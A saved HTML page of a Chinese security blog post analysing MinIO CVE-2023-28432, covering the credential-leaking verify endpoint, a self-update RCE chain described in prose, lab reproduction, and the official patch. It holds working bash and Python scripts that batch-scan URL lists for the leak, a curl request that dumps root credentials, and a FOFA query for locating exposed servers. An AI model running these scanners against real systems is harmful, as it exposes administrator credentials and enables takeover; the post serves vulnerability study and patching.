@@ -1,0 +1,746 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/flower.png">
+  <link rel="icon" type="image/png" href="/img/flower.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="keep something">
+  <meta name="author" content="luom">
+  <meta name="keywords" content="">
+  <title>MinIO verify 接口信息泄露-RCE分析(CVE-2023-28432) - RC9&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"romanc9.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"nC7Rtx8EoAwWlShCEwdRsumO-gzGzoHsz","app_key":"sqlnn9nfpy9eU5bkSY3Rpkyb","server_url":"https://nc7rtx8e.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Romanc9's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="MinIO verify 接口信息泄露-RCE分析(CVE-2023-28432)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-04-17 14:46" pubdate>
+        2023年4月17日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      42
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">MinIO verify 接口信息泄露-RCE分析(CVE-2023-28432)</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2024年3月4日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="漏洞简介">1.漏洞简介</h2>
+<p>MinIO介绍：</p>
+<p>​
+MinIO是一个基于Go语言开源的高性能、分布式对象存储服务器，可以在私有云或公有云环境中部署运行，适用于大规模数据存储和处理场景。MinIO可以用于存储和管理大量的非结构化数据，如图片、视频、日志文件等。它还提供了Docker容器化技术集成方案，方便开发人员部署服务。它支持亚马逊云的S3
+API（对象存储的接口协议），可以与各种应用程序和工具集成，使得它应用广泛。许多企业和组织都在使用它，例如：华为、谷歌、阿里云、腾讯云、VMware、Splunk、Red
+Hat等。</p>
+<p>​ MinIO的应用场景包括但不限于：</p>
+<p>1）云原生应用程序的对象存储：MinIO可以与Kubernetes、Docker等云原生技术集成，为应用程序提供对象存储服务。</p>
+<p>2）大数据分析：MinIO可以作为数据湖的一部分，存储和管理大规模的非结构化数据，为数据分析提供支持。</p>
+<p>3）备份和归档：MinIO可以作为备份和归档的存储解决方案，为企业提供数据保护和灾难恢复服务。</p>
+<p>4）云存储网关：MinIO可以作为云存储网关，将本地存储和云存储集成在一起，为企业提供灵活的存储解决方案。</p>
+<p>MinIO运行模式：</p>
+<p>​
+MinIO提供单节点模式和集群模式运行，单节点模式适用于小规模的数据存储需求，而集群模式适用于大规模的数据存储需求。</p>
+<p>​
+1）单节点模式是指在一台服务器上运行MinIO，所有的数据都存储在该服务器上。这种模式适用于小规模的数据存储需求，例如个人或小型企业的数据存储。</p>
+<p>​
+2）集群模式是指在多台服务器上运行MinIO，数据被分散存储在不同的服务器上，通过分布式算法实现数据的高可用和负载均衡。这种模式适用于大规模的数据存储需求，例如大型企业或云服务提供商的数据存储。</p>
+<p>漏洞官方通告：https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q</p>
+<p>​ MinIO
+verify接口存在敏感信息泄漏漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</p>
+<p>​
+MinIO提供了图形化控制台界面来实现自动化数据管理界面，可以简单直观地访问存储套件，即可以直接使用浏览器登录系统管理文件。而在集群模式的配置下<strong>,MinIO
+部分接口由于配置不当导致信息泄露</strong>，未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD，造成敏感信息泄露，包含内网IP泄露等，最终可能导致攻击者以管理员身份登录MinIO接口,能看到对应权限的存储文件<strong>。甚至进一步借助更新功能实现RCE。</strong></p>
+<p>​ <strong><u>只有 MinIO
+被配置为集群模式时才会受此漏洞影响</u></strong>，此漏洞的利用无需用户身份认证，官方建议所有使用集群模式配置的用户尽快升级。</p>
+<p>影响版本：</p>
+<pre><code class="hljs angelscript">版本号检测：
+<span class="hljs-number">1.</span>http请求：GET /api/v1/check-version
+<span class="hljs-number">2.</span>HTTP响应版本小于RELEASE<span class="hljs-number">.2023</span><span class="hljs-number">-03</span><span class="hljs-number">-20</span>T20<span class="hljs-number">-16</span><span class="hljs-number">-18</span>Z则存在漏洞
+MinIO <span class="hljs-number">2019</span><span class="hljs-number">-12</span><span class="hljs-number">-17</span>T23<span class="hljs-number">-16</span><span class="hljs-number">-33</span>Z &lt;= MinIO &lt; <span class="hljs-number">2023</span><span class="hljs-number">-03</span><span class="hljs-number">-20</span>T20<span class="hljs-number">-16</span><span class="hljs-number">-18</span>Z</code></pre>
+<h2 id="漏洞原理">2.漏洞原理</h2>
+<p>参考：</p>
+<blockquote>
+<p>minio搭建及使用：https://www.bmabk.com/index.php/post/2649.html</p>
+<p>https://blog.csdn.net/qq_35476650/article/details/129748849</p>
+</blockquote>
+<h3 id="信息泄漏获得账号密码">2.1 信息泄漏获得账号密码</h3>
+<p>​
+MinIO有单机部署和集群部署，源码routers.go里规定路由规则，当被配置为集群模式时会注册BootstrapREST路由，会受此漏洞影响，如下图：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042013817.png" srcset="/img/loading.gif" alt="集群模式下注册的路由" style="zoom:50%;"></p>
+<p>​
+bootstrap-peer-server.go源码定义函数注册路由器，在该路由器上注册了两个REST
+API处理程序接受HTTP请求，如下图，health请求和verify请求，这些处理程序使用httpTraceHdrs函数包装，以记录HTTP请求的跟踪信息。</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042014690.png" srcset="/img/loading.gif" alt="bootstrapREST路由器的两种API" style="zoom:50%;"></p>
+<p>​
+bootstrap-peer-server.go源码开头规定了路由访问规则，如下图。bootstrap
+RESTVersionPrefix：表示REST
+API版本号的前缀，值为"/v1"，bootstrapRESTPrefix：表示REST
+API的前缀，值为"/minio/bootstrap"，bootstrapRESTPath：表示完整的REST
+API路径，值为"/minio/bootstrap/v1"，即最终路由映射：http://xxx:9001/minio/bootstrap/v1/verify。</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042014837.png" srcset="/img/loading.gif" alt="bootstrapREST规定的路由地址" style="zoom:50%;"></p>
+<p>​
+继续分析VerifyHandler函数，源码如下图，在集群模式的配置下，MinIO界面的路由Verify传递HTTP响应和请求，加载getServerSystemCfg方法，并将其<strong>返回结果编码为JSON格式输出到响应中</strong>。</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042016361.png" srcset="/img/loading.gif" alt="VerifyHandler函数源码" style="zoom:50%;"></p>
+<p>​
+getServerSystemCfg函数：获取服务器系统配置，包括所有以"MINIO_"开头的环境变量，并去除包含在skipEnvs[envK]键值对中的，最后返回一个包含全局端点和筛选后的环境变量的ServerSystem
+Config结构体，如下图</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042016577.png" srcset="/img/loading.gif" alt="getServerSystemCfg函数源码" style="zoom:50%;"></p>
+<p>​
+<strong><u>而getServerSystemCfg函数未对用户鉴权且skipEnvs键值对过滤不全</u></strong>，如下图，由于MinIO服务端启动时会把预置的账号、密码等信息加载到环境变量，未设置则默认账号密码为minioadmin/minioadmin。</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042017707.png" srcset="/img/loading.gif" alt="配置设定的skipEnvs环境变量" style="zoom:50%;"></p>
+<p>​
+那么未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_ROOT_USER和MINIO_ROOT_PASSWORD，造成敏感信息泄露，包含内网IP泄露等，最终导致攻击者以管理员身份登录MinIO管理，访问对应权限的存储文件。</p>
+<p>​ 此漏洞的利用无需用户身份认证，利用复杂度低，影响较大，危害性高。</p>
+<p>​ 影响版本：小于RELEASE.2023-03-20T20-16-18Z。</p>
+<p>​ 版本号检测：HTTP请求：GET /api/v1/check-version，返回MinIO版本。</p>
+<p>省流总结版👇：</p>
+<blockquote>
+<p>VerifyHandler 函数中调用了 getServerSystemCfg() 函数，该函数返回了
+ServerSystemConfig 结构体，其中包含了环境变量 MINIO_
+的键值对。由于环境变量是全局可见的，因此会将账号打印出来
+。为什么环境变量中会包含账号密码信息呢？因为根据官方的启动说明，在MinIO在启动时会从环境变量中读取用户预设的管理员账号和密码，如果省略则默认账号密码为minioadmin/minioadmin</p>
+</blockquote>
+<h3 id="寻找rce利用链">2.2 寻找RCE利用链</h3>
+<p>​
+由于MinIO采用客户端/服务器（C/S）架构，客户端可以使用MinIO提供的命令行工具mc管理服务器，<strong>而MinIO后台提供自定义更新功能，通过利用这个功能运行恶意二进制文件可以实现RCE。</strong>
+​
+客户端mc可以实现远程升级MinIO服务器：<code>mc admin update ALIAS</code>。由于升级地址可以自定义，可以指定解析为特定MinIO服务器二进制版本的镜像URL：<code>mc admin update ALIAS https://minio-mirror.example.com/minio</code>
+不指定地址默认从官网更新。</p>
+<p>​ 而服务器收到更新请求，实际调用/minio/admin/v3/update?updateURL=
+{updateURL}路由处理请求，远程加载二进制文件，通过ServerUpdateHandler函数对文件下载并重启实现更新：
+​1）验证管理员权限 ​ 2）从指定地址updateURL下载最新版本（二进制文件） ​
+3）下载二进制文件的数字签名文件 ​
+4）调用verifyBinary函数验证数字签名文件的签名 ​
+5）验证无误后备份当前MinIO二进制文件并替换为新的二进制文件 ​
+6）重启MinIO服务器以使更改生效</p>
+<p><strong>由于用于验证签名的verifyBinary函数存在漏洞。</strong></p>
+<pre><code class="hljs makefile">envMinisignPubKey = <span class="hljs-string">&quot;MINIO_UPDATE_MINISIGN_PUBKEY&quot;</span>
+minisignPubkey := env.Get (envMinisignPubKey, <span class="hljs-string">&quot;&quot;</span>)</code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042023221.png" srcset="/img/loading.gif" alt="verifyBinary函数部分源码" style="zoom:50%;"></p>
+<p>​</p>
+<p>​
+envMinisignPubKey为环境变量MINIO_UPDATE_MINISIGN_PUBKEY的值，若未设定该值，则envMinisignPubKey为空，minisignPubkey变量作用：对更新包的完整性校验，<strong>为空会略过签名校验，直接更新</strong>，如上图。而官方源码默认该环境变量为空，导致漏洞出现。<strong><u>！而用Docker搭建环境的话，Dockerfile默认设定了该环境变量的值，这时无法RCE。</u></strong></p>
+<p>​
+那么可以通过构造恶意二进制文件，添加执行系统命令的恶意代码（如反弹shell）来实现RCE，但原本的MinIO服务可能会中断。为了无损利用此漏洞，需要基于MinIO源程序进行修改。</p>
+<p>​
+思路：添加一个后门路由，实现不破坏正常服务地完成RCE。此漏洞的利用与部署方式无关，只要获得管理员账号密码即可进一步实现恶意升级。</p>
+<p>​</p>
+<p>更多参考：</p>
+<blockquote>
+<p>https://cloud.tencent.com/developer/article/2256892?areaSource=&amp;traceId=</p>
+<p>https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ</p>
+<p>https://xz.aliyun.com/t/12356</p>
+<p>https://y4er.com/posts/minio-cve-2023-28432/</p>
+<p>https://exp10it.cn/2023/05/minio-cve-2023-28432-%E8%87%AA%E6%9B%B4%E6%96%B0-rce-%E5%88%86%E6%9E%90/#%E8%87%AA%E6%9B%B4%E6%96%B0-rce</p>
+<p>https://www.freebuf.com/vuls/363647.html</p>
+<p>魔改源码：https://github.com/AbelChe/evil_minio</p>
+<p>官方升级说明：https://min.io/docs/minio/linux/reference/minio-mc-admin/mc-admin-update.html#command-mc.admin.update</p>
+</blockquote>
+<h2 id="复现">3.复现</h2>
+<h3 id="环境搭建">3.1 环境搭建</h3>
+<blockquote>
+<p>https://note.dolyw.com/docker/07-MinIO.html【集群】</p>
+<p>https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md</p>
+</blockquote>
+<p>​
+用本地Docker服务开启容器，下载docker-compose.yml：其中包含3个以集群模式运行的Web服务端口，启动命令：<code>docker-compose up -d</code></p>
+<p>​ 集群启动后，访问http://localhost:9001可以查看MinIO
+Web控制台界面，如图，而http://localhost:9000是API服务。</p>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span></code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304171950082.png" srcset="/img/loading.gif" alt=" MinIO登陆界面" style="zoom: 25%;"></p>
+<p>⚠️集群启动后，访问<code>http://your-ip:9001</code>可以查看Web管理页面，访问<code>http://your-ip:9000</code>是API服务</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304172004759.png" srcset="/img/loading.gif" alt="测试环境" style="zoom: 33%;"></p>
+<h3 id="pocs">3.2 pocs</h3>
+<p>工具：python3</p>
+<p>python3 minio.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1:1111/">http://127.0.0.1:1111</a> 单个url测试</p>
+<p>python3 minio.py -f url.txt 批量检测</p>
+<p>扫描结束后会在当前目录生成存在漏洞url的vuln.txt</p>
+<blockquote>
+<p>pocs:</p>
+<p>https://github.com/MzzdToT/CVE-2023-28432</p>
+<p>https://github.com/Mr-xn/CVE-2023-28432</p>
+</blockquote>
+<p>poc1</p>
+<pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span>
+<span class="hljs-comment"># Author : whgojp</span>
+<span class="hljs-comment"># Enable colors</span>
+GREEN=<span class="hljs-string">&#x27;\033[0;32m&#x27;</span>
+NC=<span class="hljs-string">&#x27;\033[0m&#x27;</span>
+
+count=0
+
+<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span>
+  ((count++))
+
+  response=$(curl -s -XPOST <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>/minio/bootstrap/v1/verify -k&quot;</span> --connect-timeout 3)	<span class="hljs-comment">#修改一下 这里加了-k 忽略对 SSL 证书验证</span>
+  <span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$response</span>&quot;</span> | grep -q <span class="hljs-string">&quot;MinioEnv&quot;</span>; <span class="hljs-keyword">then</span>		<span class="hljs-comment">#匹配关键词</span>
+    <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GREEN&#125;</span>[!] <span class="hljs-variable">$&#123;line&#125;</span><span class="hljs-variable">$&#123;NC&#125;</span>：is Vulnerable！！！\n&quot;</span>
+    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> &gt;&gt; result.txt
+  <span class="hljs-keyword">else</span>
+    <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;[+] (<span class="hljs-variable">$&#123;count&#125;</span>/<span class="hljs-subst">$(wc -l &lt; MinIO.txt)</span>) Scanning: <span class="hljs-variable">$&#123;line&#125;</span>\n&quot;</span>
+  <span class="hljs-keyword">fi</span>
+<span class="hljs-keyword">done</span> &lt; MinIO.txt
+</code></pre>
+<p>poc2</p>
+<pre><code class="hljs bash"><span class="hljs-comment"># 需要开集群模式</span>
+curl -XPOST x.x.x.x:9000/minio/bootstrap/v1/verify
+<span class="hljs-comment"># 简单批量检测</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `cat url.txt`; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span>;curl -XPOST <span class="hljs-variable">$i</span>/minio/bootstrap/v1/verify --connect-timeout 3; <span class="hljs-keyword">done</span></code></pre>
+<p>poc3</p>
+<pre><code class="hljs python"><span class="hljs-comment">#code by step 垃圾实现，新建tagets.txt设把MinIO的api端口链接放到tagets.txt中。</span>
+<span class="hljs-comment">#很垃圾的实现就是了</span>
+
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> json
+
+<span class="hljs-comment"># 打开保存目标 URL 的文本文件</span>
+<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;targets.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f,<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;results.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f_out:
+    <span class="hljs-comment"># 逐行读取目标 URL 并发送 GET 请求</span>
+    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
+        <span class="hljs-comment"># 删除行末的换行符</span>
+        target = line.rstrip(<span class="hljs-string">&#x27;\n&#x27;</span>)
+
+        <span class="hljs-comment"># 发送 GET 请求并获取响应</span>
+        <span class="hljs-keyword">try</span>: 
+            response = requests.post(target+<span class="hljs-string">&quot;/minio/bootstrap/v1/verify&quot;</span>, data=&#123;<span class="hljs-string">&#x27;key&#x27;</span>: <span class="hljs-string">&#x27;value&#x27;</span>&#125;,timeout=<span class="hljs-number">7</span>)
+            <span class="hljs-comment"># 判断响应中是否包含特定字符串并输出结果</span>
+            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;MINIO_ROOT_PASSWORD&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;MINIO_ROOT_USER&#x27;</span> <span class="hljs-keyword">in</span> response.text:
+                print(<span class="hljs-string">f&quot;Found &#x27;vulnerable&#x27; in <span class="hljs-subst">&#123;target&#125;</span>&quot;</span>)
+                f_out.write(<span class="hljs-string">f&quot;Found &#x27;vulnerable&#x27; in <span class="hljs-subst">&#123;target&#125;</span>\n&quot;</span>)
+            <span class="hljs-keyword">else</span>: 
+                print(<span class="hljs-string">&quot;not vulnerable&quot;</span>)
+        <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
+            <span class="hljs-comment"># 如果连接失败，则打印错误信息并继续到下一个目标</span>
+            print(<span class="hljs-string">f&quot;Connection error&quot;</span>)
+            <span class="hljs-keyword">continue</span></code></pre>
+<h3 id="本地利用">3.3 本地利用</h3>
+<p>​ 用上述的poc批量扫描探测漏洞是否存在：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304171957787.png" srcset="/img/loading.gif" alt="poc批量扫描" style="zoom:50%;"></p>
+<p>​ 单个检测利用：</p>
+<p>​
+命令行直接访问漏洞地址：<code>curl 'http://localhost:9000/minio/bootstrap/v1/verify' -XPOST</code>
+即可查看敏感信息:</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042039468.png" srcset="/img/loading.gif" style="zoom:50%;"></p>
+<p>​</p>
+<p>​
+用shell命令jq看得更方便，jq：把文本字符串格式化成json格式的工具。</p>
+<p>​ jq安装：</p>
+<pre><code class="hljs awk">macos：
+brew install jq
+
+linux通用安装：
+wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/stedolan/</span>jq<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/jq-1.6/</span>jq-linux64
+chmod a+x jq-linux64 &amp;&amp; mv jq-linux64 <span class="hljs-regexp">/usr/</span>bin/jq
+
+centos：
+yum install epel-release
+yum install jq
+
+ubuntu：
+apt update
+apt install -y jq</code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304171955480.png" srcset="/img/loading.gif" alt="jq格式敏感信息" style="zoom: 25%;"></p>
+<p>关键信息：</p>
+<pre><code class="hljs 1c"><span class="hljs-string">&quot;MINIO_ROOT_USER&quot;</span>: <span class="hljs-string">&quot;minioadmin&quot;</span>,
+<span class="hljs-string">&quot;MINIO_ROOT_PASSWORD&quot;</span>: <span class="hljs-string">&quot;minioadmin-vulhub&quot;</span></code></pre>
+<p>拿到账号密码成功登陆后台：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304172000866.png" srcset="/img/loading.gif" alt="登陆MinIO后台" style="zoom: 25%;"></p>
+<h3 id="资产搜索关键词">3.4 资产搜索关键词</h3>
+<p>fofa：</p>
+<pre><code class="hljs routeros"><span class="hljs-attribute">banner</span>=<span class="hljs-string">&quot;MinIO&quot;</span> || <span class="hljs-attribute">header</span>=<span class="hljs-string">&quot;MinIO&quot;</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;MinIO Browser&quot;</span></code></pre>
+<h2 id="修复及补丁分析">4.修复及补丁分析</h2>
+<p>1.更新版本</p>
+<p>MinIO 官方已发布相应的补丁修复漏洞，用户可通过升级到
+RELEASE.2023-03-20T20-16-18Z 版本进行漏洞修复。</p>
+<p>https://github.com/minio/minio/releases/tag/RELEASE.2023-03-20T20-16-18Z</p>
+<blockquote>
+<p>补丁：https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077</p>
+<p>分析：https://y4er.com/posts/minio-cve-2023-28432/</p>
+</blockquote>
+<p>2.MinIO 官方已发布相应的补丁修复信息泄露漏洞和RCE漏洞：</p>
+<p>​ 1）环境变量过滤器增加了敏感字段，输出不会再回显账号密码。</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042048331.png" srcset="/img/loading.gif" alt=" skipEnvs增加敏感字段" style="zoom:50%;"></p>
+<p>​ 2）bootstrap-peer-server.go源码新增envValues[envK] =
+logger.HashString (env.Get(envK,
+""))，回显的环境变量不再明文处理，而是hash加密。</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042049438.png" srcset="/img/loading.gif" alt="补丁对环境变量的处理" style="zoom: 67%;"></p>
+<p>​ 3）新增HTTP请求token验证，对用户鉴权，验证不通过返回HTTP 403
+Forbidden响应，只有登录用户才能访问</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042049285.png" srcset="/img/loading.gif" alt="补丁新增用户鉴权" style="zoom:50%;"></p>
+<p>​
+4）针对利用自更新功能实现RCE的漏洞，通过在源码cmd/update.go文件增加二进制文件签名校验，签名公钥不再默认为空，服务器会验证数字签名文件的签名是否与MinIO官方发布的数字签名公钥匹配，以确保数字签名文件的真实性。</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042051826.png" srcset="/img/loading.gif" alt="补丁新增官方签名公钥" style="zoom:50%;"></p>
+<h2 id="延伸参考">延伸参考</h2>
+<blockquote>
+<p>后续rce：https://www.gksec.com/MinIO_RCE.html</p>
+<p>https://nvd.nist.gov/vuln/detail/CVE-2021-21287</p>
+<p>赵静静,金慧峰,李霄.基于MinIO存储的综合实践管理平台开发[J].软件,2022,43(10):55-59.</p>
+</blockquote>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/03/27/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0-Weblogic/">
+                        <span class="hidden-mobile">Weblogic未授权远程代码执行漏洞 (CVE-2023-21839)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
